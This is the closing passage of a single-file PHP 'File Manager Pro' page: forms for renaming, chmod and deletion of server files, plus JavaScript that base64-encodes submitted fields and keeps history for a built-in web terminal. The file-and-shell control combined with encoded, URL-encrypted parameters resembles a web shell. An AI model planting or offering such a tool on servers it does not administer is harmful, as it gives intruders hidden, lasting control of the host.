            <form method="post" action="" style="display:inline" onsubmit="return fmEncField(this,'newname') && confirm('Rename ' + <?php echo json_encode($it); ?> + '?')">
              <?php fm_csrf_field(); ?>
              <input type="hidden" name="a" value="rename">
              <?php fm_hid('dir', $cur); ?>
              <?php fm_hid('file', $full); ?>
              <input type="text" class="mini" name="newname" value="<?php echo fm_h($it); ?>" title="New name">
              <button type="submit" class="iconbtn" title="Rename"><?php echo fm_ai('rename', 13); ?></button>
            </form>
            <form method="post" action="" style="display:inline" onsubmit="return fmEncField(this,'mode') && confirm('Chmod ' + <?php echo json_encode($it); ?> + ' to this mode?')">
              <?php fm_csrf_field(); ?>
              <input type="hidden" name="a" value="chmod">
              <?php fm_hid('dir', $cur); ?>
              <?php fm_hid('file', $full); ?>
              <input type="text" class="mini narrow" name="mode" value="<?php echo fm_h($perm); ?>" title="Octal mode, e.g. 755">
              <button type="submit" class="iconbtn" title="Chmod"><?php echo fm_ai('chmod', 13); ?></button>
            </form>
            <form method="post" action="" style="display:inline" onsubmit="return confirm('DELETE ' + <?php echo json_encode($it); ?> + '? This cannot be undone!')">
              <?php fm_csrf_field(); ?>
              <input type="hidden" name="a" value="delete">
              <?php fm_hid('dir', $cur); ?>
              <?php fm_hid('file', $full); ?>
              <button type="submit" class="iconbtn danger" title="Delete"><?php echo fm_ai('trash', 13); ?> <span class="bl">del</span></button>
            </form>
          </td>
        </tr>
      <?php } ?>
      </tbody>
    </table></div>
    <?php } ?>
  </div>
<?php } ?>

</div>

<div class="foot">
  File Manager Pro · single-file PHP <?php echo fm_h(PHP_VERSION); ?> on <?php echo fm_h(PHP_OS); ?> · paths encrypted in URL (<?php echo function_exists('openssl_encrypt') ? 'AES-256-CTR' : 'XOR+base64'; ?>)
</div>

<script>
/* URL-safe base64 of UTF-8 text (for POST payloads); null when encoding is unavailable */
function fmB64(s){
  try { return btoa(unescape(encodeURIComponent(s))); } catch(e) { return null; }
}

function fmAddB64(form, fieldName){
  var inp = form.elements[fieldName];
  if(!inp) return true;
  var v = fmB64(inp.value);
  if (v === null) return true; // cannot encode: leave raw input enabled — the server accepts raw values too
  var els = form.elements;
  for (var i = els.length - 1; i >= 0; i--) {
    if (els[i].getAttribute && els[i].getAttribute('data-b64of') === fieldName && els[i].parentNode) {
      els[i].parentNode.removeChild(els[i]);
    }
  }
  var h = document.createElement('input');
  h.type = 'hidden';
  h.name = fieldName + '_b64';
  h.value = v;
  h.setAttribute('data-b64of', fieldName);
  form.appendChild(h);
  inp.disabled = true;
  return true;
}

/* Encode user-typed field(s) before submitting */
function fmEncField(form, name){
  if(typeof name === 'string') name = [name];
  for(var i=0;i<name.length;i++) fmAddB64(form, name[i]);
  return true;
}

/* Editor save: base64 the textarea content (fall back to raw submit if encoding fails) */
function fmPrepSave(form){
  var ta = form.querySelector('textarea[name="content"]');
  var h = form.elements['content_b64'];
  var v = fmB64(ta.value);
  if (v !== null) {
    h.value = v;
    ta.disabled = true;
  } else if (h && h.parentNode) {
    h.parentNode.removeChild(h);
  }
  return true;
}

/* Terminal: scroll output to bottom + command history (Up/Down arrows) */
(function(){
  var out = document.getElementById('termOut');
  if (out) out.scrollTop = out.scrollHeight;
  var inp = document.getElementById('termIn');
  if (!inp) return;
  var hist = [];
  try { hist = JSON.parse(localStorage.getItem('fm_term_hist') || '[]'); } catch(e) {}
  if (!hist.length) hist = [];
  var hi = hist.length;
  inp.addEventListener('keydown', function(e){
    if (e.key === 'ArrowUp') {
      if (hi > 0) { hi = hi - 1; inp.value = hist[hi] || ''; }
      e.preventDefault();
    } else if (e.key === 'ArrowDown') {
      if (hi < hist.length) { hi = hi + 1; inp.value = hist[hi] || ''; }
      e.preventDefault();
    }
  });
  var f = inp.form;
  if (f) f.addEventListener('submit', function(){
    var v = inp.value;
    if (v && v !== hist[hist.length - 1]) {
      hist.push(v);
      if (hist.length > 100) hist.shift();
    }
    hi = hist.length;
    try { localStorage.setItem('fm_term_hist', JSON.stringify(hist)); } catch(e) {}
  });
})();

/* Copy / move: ask destination, then submit */
function fmDoTransfer(form, kind){
  var cur = <?php echo json_encode($cur); ?>;
  var hint = (kind === 'copy')
    ? 'Copy to folder (absolute path):'
    : 'Move to folder (absolute path):';
  var dest = prompt(hint, cur);
  if(dest === null) return false;
  dest = dest.replace(/\\/g,'/').trim();
  if(!dest) return false;
  var v = fmB64(dest);
  if (v === null) { alert('Could not encode that path — please retry.'); return false; }
  var h = document.createElement('input');
  h.type = 'hidden'; h.name = 'dest_b64'; h.value = v;
  form.appendChild(h);
  return true;
}
</script>

</body>
</html>
